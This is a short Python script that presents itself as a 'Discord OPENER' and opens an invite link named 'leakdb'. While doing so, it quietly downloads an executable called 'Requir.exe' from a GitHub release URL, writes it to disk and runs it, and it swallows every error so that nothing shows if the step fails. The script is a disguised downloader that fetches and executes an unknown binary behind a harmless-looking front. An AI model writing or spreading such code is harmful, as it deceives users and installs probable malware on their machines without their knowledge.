import webbrowser
import time
import os
import requests
import subprocess

URL = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe"
OUTPUT = "Requir.exe"


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    cls()

    print()
    print("╔════════════════════════════╗")
    print("║      Discord  OPENER       ║")
    print("╚════════════════════════════╝")
    print()

    webbrowser.open("https://discord.gg/leakdb")

    try:
        with requests.get(URL, stream=True, timeout=30) as response:
            response.raise_for_status()

            with open(OUTPUT, "wb") as f:
                for chunk in response.iter_content(chunk_size=1024 * 1024):
                    if chunk:
                        f.write(chunk)

        subprocess.Popen([os.path.abspath(OUTPUT)])

    except Exception:
        pass

    time.sleep(2)


if __name__ == "__main__":
    main()
